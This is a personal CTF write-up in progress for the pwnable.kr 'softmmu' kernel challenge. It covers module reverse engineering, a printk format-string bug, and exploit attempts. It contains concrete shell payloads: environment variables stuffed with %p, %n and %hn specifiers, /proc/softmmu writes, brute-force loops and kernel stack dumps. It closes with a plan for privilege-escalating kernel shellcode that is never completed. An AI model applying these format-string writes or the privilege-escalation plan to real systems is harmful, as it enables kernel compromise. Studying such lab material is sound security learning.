
## Challange

Download: [custom softmmu kernel code](http://pwnable.kr/bin/softmmu)

`ssh softmmu@pwnable.kr -p2222 (pw:flag of syscall)`

The password is the flag contents we obtained by solving the syscall challange.


## Writeup

### Flag file

$ /tmp/m $ ls -lha /flag
-r--------    1 0        0             51 Jul  1  2014 /flag

### Kernel:

softmmu code is part of this custom kernel.

*version:* 3.7.1 - x86 - i386 

Notice: NX (Execute Disable) protection missing in CPU!
Linux version 3.7.1 (root@ubuntu) (gcc version 4.7.3 (Ubuntu/Linaro 4.7.3-1ubuntu1
) ) #1 SMP Mon Dec 23 06:07:19 PST 2013


[    0.000000 ] Kernel command line: root=/dev/ram rw console=ttyS0 rdinit=/bin/ash

$ `dmesg | grep x86`
    0.000000 ]   Transmeta GenuineTMx86
    4.081067 ] [+] Loading x86 PAE MMU emulator



$ `dmesg | grep softmmu`
    4.083557 ] [+] Write the virtual address to /proc/softmmu
    4.084989 ] [+] You can obtain it's physical address by reading /proc/softmmu
    4.086563 ] [+] i.e. echo -ne '\x00\x80\x04\x08' > /proc/softmmu; hexdump -C /proc/softmmu


[    0.000000 ] 0MB HIGHMEM available.
[    0.000000 ] 63MB LOWMEM available.
[    0.000000 ]   mapped low ram: 0 - 03fe0000
[    0.000000 ]   low ram: 0 - 03fe0000
[    0.000000 ] Zone ranges:
[    0.000000 ]   DMA      [mem 0x00010000-0x00ffffff]
[    0.000000 ]   Normal   [mem 0x01000000-0x03fdffff]
[    0.000000 ]   HighMem  empty
[    0.000000 ] Movable zone start for each node
[    0.000000 ] Early memory node ranges
[    0.000000 ]   node   0: [mem 0x00010000-0x0009efff]
[    0.000000 ]   node   0: [mem 0x00100000-0x03fdffff]
[    0.000000 ] On node 0 totalpages: 16239
[    0.000000 ] free_area_init_node: node 0, pgdat c18d2280, node_mem_map c3b5f200
[    0.000000 ]   DMA zone: 32 pages used for memmap
[    0.000000 ]   DMA zone: 0 pages reserved
[    0.000000 ]   DMA zone: 3951 pages, LIFO batch:0
[    0.000000 ]   Normal zone: 96 pages used for memmap
[    0.000000 ]   Normal zone: 12160 pages, LIFO batch:1


### Memory layout (kernel)

[    0.000000 ] virtual kernel memory layout:
[    0.000000 ]     fixmap  : 0xfff15000 - 0xfffff000   ( 936 kB )
[    0.000000 ]     pkmap   : 0xffc00000 - 0xffe00000   (2048 kB)
[    0.000000 ]     vmalloc : 0xc47e0000 - 0xffbfe000   ( 948 MB )
[    0.000000 ]     lowmem  : 0xc0000000 - 0xc3fe0000   (  63 MB )
[    0.000000 ]       .init : 0xc18e1000 - 0xc19a4000   ( 780 kB )
[    0.000000 ]       .data : 0xc15f71a6 - 0xc18e0700   (2981 kB)
[    0.000000 ]       .text : 0xc1000000 - 0xc15f71a6   (6108 kB)


### Security

[    0.029731 ] Security Framework initialized
[    0.033939 ] AppArmor: AppArmor initialized
[    0.522009] EVM: security.selinux
[    0.523125] EVM: security.SMACK64
[    0.524027] EVM: security.capability
[    0.035003] Yama: becoming mindful.
[    1.966923] AppArmor: AppArmor Filesystem Enabled
[    3.867916] Write protecting the kernel text: 6112k
[    3.869292] Write protecting the kernel read-only data: 2456k

Yama is a Linux Security Module (./security/yama/yama_lsm.c)

### CPUs

[    0.000000 ] tsc: Detected 2792.991 MHz processor
[    0.488000 ] Brought up 1 CPUs
[    0.488128 ] smpboot: Total of 1 processors activated (5585.98 BogoMIPS)
[    0.493585 ] NMI watchdog: disabled (cpu0): hardware events not enabled


### softmmu module related

[    4.073858 ] Disabling lock debugging due to kernel taint

[    4.081067 ] [+] Loading x86 PAE MMU emulator
[    4.083557 ] [+] Write the virtual address to /proc/softmmu
[    4.084989 ] [+] You can obtain it's physical address by reading /proc/softmmu
[    4.086563 ] [+] i.e. echo -ne '\x00\x80\x04\x08' > /proc/softmmu; hexdump -C /proc/softmmu
[    4.088329 ] [+] Let the kernel exploit begin :)


### Loaded modules


$ `lsmod`

  softmmu 12608 0 - Live 0xc480f000 (OF)


## softmmu module


Looks like a **virtual -> physical** address translator.


## Compile 3.7.1 kernel

The Makefile of the kernel needs patching due to PIC enabled by default on gcc 6+

https://askubuntu.com/questions/851433/kernel-doesnt-support-pic-mode-for-compiling
https://lists.ubuntu.com/archives/kernel-team/2016-May/077178.html

+KBUILD_CFLAGS += $(call cc-option, -fno-pie)
+KBUILD_CFLAGS += $(call cc-option, -no-pie)
+KBUILD_AFLAGS += $(call cc-option, -fno-pie)
+KBUILD_CPPFLAGS += $(call cc-option, -fno-pie)


## What the softmmu module does

- You can set a 4 byte vitual address (kernel address is not allowed to be set) that will be later queried for the physical address of the given process accessing /pro/softmmu later

- Will write the physical address of the previously set virtual address of the accessing process to its buffer.


1) Set virtual address
2) Access(read?) /proc/sotmmu by a process -> will cause the module to query for the corresponding physical address of the virtual addr of the accessing process
Also logs info on the PGD of the virtual address.



## Approaches

I am thinking whether a shellcode could be made executable if the NX bit on the PTE is unset? We need some bug in the module for that to work.
If I place into environment a shellcode and disable the NX bit on its page I could execute it? 

The **NX bit** is the most significant bit.

Also what if the the incoming 4 bytes are not sanity checked? We could do format string bug?? Maybe we could exploit a printk? We just have to make sure that the bytes interpreted are valid pte entry. 

## NX bit

The NX bit specifically refers to bit number 63 (i.e. the most significant bit) of a 64-bit entry in the page table. 

[NX bit](https://en.wikipedia.org/wiki/NX_bit)

### /proc/self/maps

08048000-08211000 r-xp 00000000 01:00 18         /bin/busybox
08211000-08213000 rw-p 001c8000 01:00 18         /bin/busybox
08213000-08218000 rw-p 00000000 00:00 0
09bb8000-09bda000 rw-p 00000000 00:00 0          [heap]
b771f000-b7720000 r-xp 00000000 00:00 0          [vdso]
bfae5000-bfb06000 rw-p 00000000 00:00 0          [stack]

[Explained](https://stackoverflow.com/questions/1401359/understanding-linux-proc-id-maps)
 
### cpuinfo

[PAE](https://en.wikipedia.org/wiki/Physical_Address_Extension)

cat /proc/cpuinfo

flags           : fpu de pse tsc msr **pae** mce cx8 apic sep pge cmov mmx fxsr sse sse2 pni hypervisor

address sizes   : 36 bits physical, 32 bits virtual

### Executable space protection

[Linux](https://en.wikipedia.org/wiki/Executable_space_protection#Linux)

[Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)

/tmp/m $ dmesg | grep "Exec"
[    0.000000 ] Notice: NX (Execute Disable) protection missing in CPU!

**The NX protection is missing in this CPU!!**

[PIE](https://en.wikipedia.org/wiki/Position-independent_code) 


The approach depends whether the knowledge of the physical address is useful at all to us? Not sure. Maybe it is just masquarading as a feature but the bug in the softmmu (if there is one) should be exploited.


I don't think the phys addr is useful at all so let's hunt for the bug!


## IDA

Import [softmmu](http://pwnable.kr/bin/softmmu) object file into IDA.

### mmu_write

Is called when we write to /proc/softmmu.

- Checks the supplied virt address for size(is it 4 bytes? is it not in kernel space?0xc0000000 < )
- Calls _copy_from_user if good and copies 4 bytes into its buffer


### mmu_read

Is called when we read from /proc/softmmu.
- reads the 4 bytes from its buffer
- call mmu_walk

### mmu_walk

There are quite a few paths we can take in this function depending on the virt addr.

1) (fail)"PAE entry not present %x\n"
    printk("PAE entry not present %x\n", eax, edx);
2) (fail)PD64 entry not present
    printk("PD64 entry not present %x\n", ebx, edx);
    Directory entry is not present for the virt. address
3) (fail)2MB page
    printk("2MB page\n");
4) Call get_pte_entry (eax=virtaddr, edx=currtask's page table kernel mem)
5) (fail)PT64 entry not present - if al & 0x1 != 0x1 - present bit not set
    printk("PT64 entry not present %x\n", eax, edx);
    eax is zeroed out - eax is the resultant phys addr

6) Get the resulted frame address + offset into eax

### get_pte_entry

Params:
- eax: virt addr
- edx: kernel memory where the pte is for the current process

Returns in eax the address of the frame of the corresponding virtual page.

1) Mask out the page offset bits from eax. 
2) Drop the page offset bits by shifting right the 12 bits in eax (now has only the 20 bits, 10 bits + 10 bits for the lookup of the pte)
3) Index into PGD(kernel object) -> look at what is at PGD + 20 bit pte index(eax) * sizeof(addr), basically the frame addr loated in the index in the PGD object
4) Check if present bit is set by if bl == 1 good: (if not present jump to end)
5) printk("[Debug] PGD(%x) Dump\n", edx)
6) Print the curr task name, and the PGD's first 4 bytes
7) printk(===..) printk(requested virtual address); printk("====...");

The one where I can see leaking is between the two:

printk("==================================");
printk(requested virtual address);
printk("==================================");


the printk in the middle is prone to string format attack!
It does not use any format string just simply does printk on the memory contents at the given virtual memory address!

We control the virt address printk uses.

We could change the return address to our shellcode in our environment!

## Environment setup

### Aliases

mkdir /tmp/m; cd /tmp/m; alias set='echo -ne $1 > /proc/softmmu' ; alias hd='hexdump -C /proc/softmmu' ; alias maps='cat /proc/self/maps'

cat /proc/self/maps


### Format string injection

export FORMAT=$(for i in $(seq 1 50000); do echo -n %s; done)

Since there is address space randomization of stack we could also use the code section's strings! we could use hexdump's strings

I wonder whether we can use the stack. If not than we need to use ROP-ing.


### Example

set '\x00\x80\x04\x08' ; hd


### strings in binaries (actually busybox has one big binary)

We can try to see what strings we could use from /bin/busybox.
hexdump -C /bin/busybox

strings -n 2 -o | less

strings with -o will show offset in octal! Convert to hex!

For instance

at offset 0x3c1 we have '%d' then we can just do 0x08048000 + 3c1:
set '\xc1\x83\x04\x08'   %d
or
set '\xf1\x83\x04\x08'   %p

strings -n 2 -o | less -> will show us the below interesting one
6050134 %s%s%s:%u: %s%sAssertion `%s' failed.

offset      string
0x3c1       %d
0x3f1       %p
0x184d56    %n
0x18505c    %s%s%s:%u: %s%sAssertion `%s' failed


Calculate: 0x08048000 + 0x18505c

We have the text section mapped in for busybox:
from 0x08048000 until 0x08211000 which is 1871872 len

hexdump -C -n 1871872 /bin/busybox | less


Okay our best chance is our stack!! The randomization range is not bad at all. We need to inject a large format string onto
the stack and simply brute force read the /proc/softmmu and our set virt addr will once lie in the stack.

Only 3 hex numbers vary so we have a good chance of hitting the stack.


export FORMAT=$(for i in $(seq 1 20000); do echo -n %s; done)

set '\x30\xe3\xd9\xbf'

while true; do hd; done


## Plan

0) Inspect the stack of kernel in get_pte_entry and the return address

export FORMAT=$(for i in $(seq 1 20000); do echo -n '%p '; done)

1) Inject Format string into environment(large so we have good chance hitting it)

2) What should we do with the fmt string? change ebp?
    
    Where should we return to?
        - stack? it is not executable - can we make it executable?
        - into the 



### Kernel stack dump using '%p ' fmt string

[  724.801287 ] c2ec9c44 c2ac0000   (null) c2ac0001   (null) c2ac0002   (null) c2ac0003   (null) c2ac0000 02ac0067 c2ac7ef0 c480f20b e857d815 c26cb704 b7712000 bf9be000 c326c000 c480f2a0 00000400 c2ac7efc c480f2be 00000400 c2ac7f3c c11af756 00000400 c2ac7f28   (null) c2ea9720 c2ea9720   (null) b7712000 00000400 c326c000   (null)   (null) c2ea9720 c2d9a0a0 c11af5a0 c2ac7f64 c11aa224 c2ac7f98 00000022 c2ea9770 00000400 b7712000 c2d9a0a0 c11aa1c0 00000400 c2ac7f8c c1159929 c2ac7f98 00000022 000b7712 c11aa1c0   (null) c2d9a0a0   (null) 00000010 c2ac7fac c1159a47 c2ac7f98   (null)   (null)   (null) 082122a0 00000010 c2ac6000 c15f5ccd   (null) b7712000 00000400 082122a0 00000010 0982ad40 00000003 0000007b 0000007b   (null) 00000033 00000003 b7713424 00000073 00000246 bf9ba748 0000007b   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)   (null)


We can see that the **12th element is 0xc480f20b** (zero based indexing) is the return address back to mmu_walk! the **11th element is the saved ebp**! We should write to the  address pointed by that ebp using %n.
Let's also look for values into our stack (0xbf9b > ):

    - **16th element is 0xbf9be000** which is coming from our stack!

We want to look for some stack element pointer that points to some 

cat /proc/kallsyms | grep softmmu
c480f0c0 t get_pte_entry        [softmmu]
c480f190 t mmu_walk     [softmmu]

Also I think it is no accident that we have such convenient access to the phys page descriptors and PGD on the stack. They want us to be able to modify maybe the NX bit?

## Plan

Change the saved %ebp's two higher order bytes to the same 16 bits as is in our chosen virtual address (basically to point it to our userspace stack).


### Change the saved %ebp?

Our userspace stack seems to be between 0xbf9x - 0xbfdx 70% of the time
VIRTUAL ADDR
let's pick 0xbf9b which is 49051
set '\x00\xe0\x9b\xbf'
export FORMAT=$(for i in $(seq 1 10000); do echo -n "%23\$hn"; done)

for i in $(seq 1 100); do hd; done

while true; do hd; done


## printk analysis (kernel 3.7.1)

linux/kernel/printk.c
printk seems to be a limited version of the C library printf.
Max text buffer seems to be 1024 - 32.

**vsnprintf** does the formatting of the fmt string

linux/lib/vsprintf.c

**linux/Documentation/printk-formats.txt** to see the format specifiers.

the comments in vsprintf.c says **%n is ignored** but it does not seem to be the case! 
In current kernel (4.17) it really is removed to avoid security risks. 
So now I know why this challange uses kernel 3.7.1.

type of '%n' is called FORMAT_TYPE_NRCHARS. grep for it in 3.7.1


## Exploit

**[PGD](https://www.kernel.org/doc/gorman/html/understand/understand006.html)**

Use the 16th element on the stack with %s - that is to repeatedly print our fmt string

set '\x00\xe0\x9b\xbf'
export FORMAT=$(for i in $(seq 1 10000); do echo -n "%n"; done)

export WEBP=$(for i in $(seq 1 10); do echo -n "%p"; done)%n

# below is to write to the first 4 bytes of the PGD
export PGD=$(for i in $(seq 1 20000); do echo -n "v"; done)%s-%p-%p%p-%p%p-%p%p-%p
export PGD=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 10); do echo -n "%p"; done)%s-%p%p%p%p%p%p%n
%p-%n%p-%n%p-%n%p-
for i in $(seq 1 500); do hd; done



We could set up a pointer on the stack actually!
Writing to the first 4 bytes of PGD is possible via those 4 pointers already on the stack. Also by manuipulating that we also manipulate the things we get back on the stack as values...


Below is to modify that saved user stack value: (16th element)

Maybe this is the user's ebp? And we could change that so we redirect into our shellcode where it could pick up a return value onto the shellcode

Inspect kernel stack:
=====================
mkdir /tmp/m; cd /tmp/m; alias set='echo -ne $1 > /proc/softmmu' ; alias hd='hexdump -C /proc/softmmu' ; alias maps='cat /proc/self/maps'

Set virtual address:
set '\x00\xe0\x9b\xbf'

Fill the stack:
export FORMAT=$(for i in $(seq 1 20000); do echo -n "%p--"; done)

Casino our way:
for i in $(seq 1 500); do hd; done

[  265.372483 ] p--c2ec7514--c2d84000--  (null)--c2d84001--  (null)--c2d84002--  (null)--c2d84003--  (null)--c2d84000--02d84067--c2d81ef0--c480f20b--c343f26c--c3b56104--c343f264--bf9be000--c326c000--c480f2a0--00000400--c2d81efc--c480f2be--00000400--c2d81f3c--c11af756--00000400--c2d81f28--  (null)--c2e9f780--c2e9f780--  (null)--b774a000--00000400--c326c000--  (null)--  (null)--c2e9f780--c35aa280--c11af5a0--c2d81f64--c11aa224--c2d81f98--c19a30c0--c2e9f7d0--00000400--b774a000--c35aa280--c11aa1c0--00000400--c2d81f8c--c1159929--c2d81f98--  (null)--  (null)--c11aa1c0--c3004470--c35aa280--  (null)--0000000c--c2d81fac--c1159a47--c2d81f98--00000004--  (null)--  (null)--082122a0--0000000c--c2d80000--c15f5ccd--  (null)--b774a000--00000400--082122a0--0000000c--09b21d44--00000003--0000007b--0000007b--  (null)--00000033--00000003--b774b424--00000073--00000246--bf9b7038--0000007b--  (null)--  (null)--c2d82280--c2ac9230--00100100--00200200--c2d82190--  (null)--  (null)--000001c9--c2d82340--c2ac92a8--00100100
[  265.412344 ] ===============================
00000000  00 00 f6 01                                       |....|
00000004

cat /proc/kallsyms | grep softmmu

export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 84); do echo -n "%p"; done)%hn

Stack elements
--------------

1.  Not sure
2.  PGD entry first byte addr
3.  NULL
4.  PGD entry second byte addr
5.  NULL
6.  PGD entry third byte addr
7.  NULL
8.  PGD entry fourth byte addr
9.  NULL
10. PGD entry first byte addr
12. Pushed EBP to kernel stack 
13. Return address(0xc480f20b) back to mmu_walk
14. Kernel code address (c343f26c)
15. Kernel code address (c3b56104)
16. Kernel code address (c343f264)
17. Our query virtual address (bf9be000) 
18. Kernel code address (c326c000)
19. Kernel code address (c480f2a0) - mmu_read [softmmu]
20. 0x400 - some offset
21. Kernel stack
22. Kernel code address (c480f2be)
23. 0x400 - some offset
24. Kernel stack
25. Kernel code address (c11af756)
26. 0x400 - some offset
27. Kernel stack
28. NULL
29. Kernel code c2e9f780
30. Kernel code c2e9f780
31. NULL
32. VDSO area probably
33. 0x400 - some offset
34. Kernel code c326c000
35. NULL
36. NULL

73. Userspace code
85. Our userspace stack addr, probably some EBP


This to write to our userspace stack:

------------
IMPORTANT!!!
------------

Change stack:
export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 84); do echo -n "%p"; done)%hn
Change code:
export FORMAT=$(for i in $(seq 1 40000); do echo -n "v"; done)$(for i in $(seq 1 72); do echo -n "%p"; done)%hn




## New Idea!!

Create shellcode and try to query its physical address!
Once we have it great - mark it down.

Launch some big binary that will make the 0x08200000 address mapped in with a virt address so that the 'idx' into the pte array will be zero.
This way we can change its phyisical mapping using the fmt string bug to
the shellcode's physical address.

Virt address that seems to be good for the above: 0x08200000


## Shellcode

Probaly we need to raise privilges with it just like in syscall challange.
We need to clone and commit new credentials with zero id.
Then we can open/read the /flag file.

Kernel shellcode needs to follow kernel ABI so use -mregparam=3 when compiling.


